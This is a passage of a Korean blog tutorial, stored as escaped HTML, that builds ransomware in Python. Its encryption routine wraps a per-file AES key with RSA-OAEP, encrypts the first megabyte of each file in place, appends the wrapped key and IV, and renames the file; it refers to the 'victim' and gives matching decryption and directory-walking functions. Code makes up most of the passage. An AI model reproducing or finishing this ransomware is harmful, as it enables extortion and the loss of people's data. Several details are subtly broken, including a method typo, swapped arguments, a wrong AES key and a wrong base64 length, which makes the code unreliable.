&lt;li&gt;&lt;code&gt;symEncryptDirectory(publicKey, dir)&lt;/code&gt;: &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xB97C; &amp;#xBC1B;&amp;#xC544;&amp;#xC11C; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC628;&amp;#xB2E4;. &amp;#xADF8; &amp;#xD6C4; &lt;code&gt;symEncryptFile&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symDecryptDirectory(privateKey, dir)&lt;/code&gt;: &lt;code&gt;symEncryptDirectory&lt;/code&gt;&amp;#xC640; &amp;#xBE44;&amp;#xC2B7;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBC18;&amp;#xB300;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rsaEncryptSecret&#34;&gt;&lt;a href=&#34;#rsaEncryptSecret&#34; class=&#34;headerlink&#34; title=&#34;rsaEncryptSecret&#34;&gt;&lt;/a&gt;rsaEncryptSecret&lt;/h1&gt;&lt;p&gt;RSA&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; secret key&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. RSA&amp;#xB294; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB79C;&amp;#xB364;&amp;#xC131; &amp;#xC5C6;&amp;#xC774; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB418;&amp;#xBBC0;&amp;#xB85C; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; RSA&amp;#xC5D0; &amp;#xB79C;&amp;#xB364;&amp;#xC131;&amp;#xACFC; &lt;a href=&#34;https://en.wikipedia.org/wiki/Trapdoor_function&#34;&gt;one-way permutation trapdoor&lt;/a&gt;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C; padding scheme&amp;#xC778; &lt;a href=&#34;https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding&#34;&gt;Optimal asymmetric encryption padding(OAEP)&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. OAEP&amp;#xC640; &amp;#xAC19;&amp;#xC774; RSA&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C; &amp;#xACB0;&amp;#xACFC; cypher &amp;#xD06C;&amp;#xAE30;&amp;#xB294; modulus(&lt;code&gt;key size/8&lt;/code&gt;)&amp;#xACFC; &amp;#xAC19;&amp;#xC544;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. 2048bit RSA&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; 256 bytes&amp;#xC758; resulting cyphertext&amp;#xAC00; &amp;#xB098;&amp;#xC640;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;rsaEncryptSecret&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;string, publicKey&lt;/span&gt;):&lt;/span&gt;
	  public_key = get_key(publicKey, &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object&lt;/span&gt;
	  cipher_rsa = PKCS1_OAEP.new(public_key)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We need to encode the string to work with bytes instead of chars&lt;/span&gt;
	  bytestrings = str.encode(string)
	  cipher_text = cipher_rsa.encrypt(bytestrings)
	  &lt;span class=&#34;hljs-comment&#34;&gt;#At this point the cipher_text should be 256 bytes in length&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We&amp;apos;ll base64 encode it for convenience&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding &lt;/span&gt;
	  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; base64.b64encode(cipher_text)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Source: &lt;a href=&#34;https://stackoverflow.com/questions/13378815/base64-length-calculation&#34;&gt;https://stackoverflow.com/questions/13378815/base64-length-calculation&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;RsaDecryptSecret&#34;&gt;&lt;a href=&#34;#RsaDecryptSecret&#34; class=&#34;headerlink&#34; title=&#34;RsaDecryptSecret&#34;&gt;&lt;/a&gt;RsaDecryptSecret&lt;/h1&gt;&lt;p&gt;&amp;#xC81C;&amp;#xACF5;&amp;#xB41C; secret key&amp;#xB85C; cipher text&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;rsaDecryptSecret&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;string, privateKey&lt;/span&gt;):&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We firts import the private Key&lt;/span&gt;
	  private_key = get_key(privateKey, &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Decode the base64 encoded string&lt;/span&gt;
	  base64DecodedSecret = base64.b64decode(string)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# create the cipher object&lt;/span&gt;
	  cipher_rsa = PKCS1_OAEP.new(private_key)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Decrypt the content&lt;/span&gt;
	  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Remember to convert the decoded cipher from bytes to string&lt;/span&gt;
	  decryptedSecret = decryptedBytestrings.decode()
	  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; decryptedSecret&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;SymEncryptFile&#34;&gt;&lt;a href=&#34;#SymEncryptFile&#34; class=&#34;headerlink&#34; title=&#34;SymEncryptFile&#34;&gt;&lt;/a&gt;SymEncryptFile&lt;/h1&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC694; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xBA70; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;publicKey&amp;#xC640; file path&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;symEncryptFile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;publicKey, file&lt;/span&gt;):&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD2B9;&amp;#xC815; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;key = generateKey()&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;publicKey&amp;#xB85C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;encryptedKey = rsaEncryptSecret(key, publicKey)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;(n byte)&amp;#xB97C; &amp;#xC815;&amp;#xC758;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; 1MB&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;buffer_size = &lt;span class=&#34;hljs-number&#34;&gt;1048576&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC774;&amp;#xBBF8; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC774;&amp;#xBBF8; &amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0; &amp;#xBB34;&amp;#xC2DC;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; file.endswitch(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName):
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;File is already encrypted, skipping&amp;apos;&lt;/span&gt;)
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xCCAB; n &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xACE0; content&amp;#xB97C; overwrite &amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Open the input and output files&lt;/span&gt;
		input_file = open(file, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;r+b&amp;apos;&lt;/span&gt;)
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Encrypting file: &amp;quot;&lt;/span&gt;+ file)
		output_file = open(file + &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;.&amp;apos;&lt;/span&gt; + cryptoName, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;w+b&amp;apos;&lt;/span&gt;)

&lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object and encrypt the data&lt;/span&gt;
		cipher_encrypt = AES.new(key, AES.MODE_CFB)

&lt;span class=&#34;hljs-comment&#34;&gt;# Encrypt file first&lt;/span&gt;
		input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
		buffer = input_file.read(buffer_size)
		ciphered_bytes = cipher_encrypt.encrypt(buffer)

input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
input_file.write(ciphered_bytes)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; &lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D;&amp;#xC5D0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, os.SEEK_END)
input_file.write(encryptedKey.encode())&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D;&amp;#xC5D0; AES IV(initialization vector)&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, os.SEEK_END)
input_file.write(cipher_encrypt.iv)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xAC00; &amp;#xB41C; &amp;#xC9C0; &amp;#xC2DD;&amp;#xBCC4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBC14;&amp;#xAFBC;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.close()
  os.rename(file, file + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD6C4; &amp;#xB300;&amp;#xB7B5;&amp;#xC801;&amp;#xC778; &amp;#xD30C;&amp;#xC77C; &amp;#xAD6C;&amp;#xC870;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC5C8;&amp;#xB358; &amp;#xAC83;&amp;#xC744; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xB77C;. file object&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;seek()&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD558;&amp;#xACE0; &amp;#xBE60;&amp;#xB974;&amp;#xAC8C; &amp;#xC791;&amp;#xC5C5;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB610; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; AES IV&amp;#xC640; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD0A4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xD14D;&amp;#xC2A4;&amp;#xD2B8; &amp;#xD30C;&amp;#xC77C;&amp;#xC740; &amp;#xD544;&amp;#xC694; &amp;#xC5C6;&amp;#xB2E4;. victim&amp;#xC740; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC5D0;&amp;#xAC8C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD30C;&amp;#xC77C;&amp;#xC774;&amp;#xB4E0; &amp;#xBCF4;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xD2B9;&amp;#xC815;&amp;#xD55C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; private key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png&#34; alt&gt;&lt;/p&gt;
&lt;h1 id=&#34;SymDecryptFile&#34;&gt;&lt;a href=&#34;#SymDecryptFile&#34; class=&#34;headerlink&#34; title=&#34;SymDecryptFile&#34;&gt;&lt;/a&gt;SymDecryptFile&lt;/h1&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC694; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xBA70; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;privateKey&amp;#xC640; file path&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;symDecryptFile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;privateKey, file&lt;/span&gt;):&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; decryption size(n &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;, &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xC5D0;&amp;#xC11C; &amp;#xC4F4; &amp;#xAC83;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;)&amp;#xB97C; &amp;#xC815;&amp;#xC758;&amp;#xD574;&amp;#xB77C;. &amp;#xC608;&amp;#xC2DC;&amp;#xB294; 1MB&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;buffer_size = &lt;span class=&#34;hljs-number&#34;&gt;1048576&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD655;&amp;#xC7A5;&amp;#xC790;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; file.endswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName):
		out_filename = file[:-(len(cryptoName) + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)]
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Decrypting file: &amp;quot;&lt;/span&gt; + file)
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; :
	print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;File is not encrypted&amp;apos;&lt;/span&gt;)
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC5F4;&amp;#xC5B4; AES IV(&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; 16&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;)&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file = open(file, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;r+b&amp;apos;&lt;/span&gt;)

&lt;span class=&#34;hljs-comment&#34;&gt;# Read in the iv&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-16&lt;/span&gt;, os.SEEK_END)
iv = input_file.read(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# we move the pointer to 274 bbytes before the end of file&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;# (258 bytes of the encryption key + 16 of the AES IV)&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-274&lt;/span&gt;, os.SEEK_END)

&lt;span class=&#34;hljs-comment&#34;&gt;# And we read the 258 bytes of the key&lt;/span&gt;
secret = input_file.read(&lt;span class=&#34;hljs-number&#34;&gt;258&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;private key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;key = rsaDecryptSecret(cert, secret)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xC815;&amp;#xC758;&amp;#xD55C; aes-encrypted buffer size&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xCCAB; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xC791;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object&lt;/span&gt;
cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)

&lt;span class=&#34;hljs-comment&#34;&gt;# Read the encrypted header&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
buffer = input_file.read(buffer_size)

&lt;span class=&#34;hljs-comment&#34;&gt;# Decrypt the header with the key&lt;/span&gt;
decrypted_bytes = cipher_encrypt.decrypt(buffer)

&lt;span class=&#34;hljs-comment&#34;&gt;# Write the decrypted text on the same file&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
input_file.write(decrypted_bytes)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; IV&amp;#xC640; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBCC0;&amp;#xACBD;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Delete the last 274 bytes from IV + key.&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-274&lt;/span&gt;, os.SEEK_END)
input_file.truncate()
input_file.close()

&lt;span class=&#34;hljs-comment&#34;&gt;# Rename the file to delete the encrypted extenstion&lt;/span&gt;
os.rename(file, out_filename)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&lt;/h1&gt;&lt;p&gt;&amp;#xBAA8;&amp;#xB4E0; &amp;#xD568;&amp;#xC218; &amp;#xC791;&amp;#xC131;&amp;#xC774; &amp;#xB05D;&amp;#xB098;&amp;#xBA74; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC815;&amp;#xD655;&amp;#xD558;&amp;#xAC8C; &lt;code&gt;symEncryptDirectory/symDecryptDirectory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xCF54;&amp;#xB529;&amp;#xD588;&amp;#xC73C;&amp;#xBA74; &amp;#xC554;&amp;#xD638;&amp;#xD654;, &amp;#xBCF5;&amp;#xD638;&amp;#xD654; 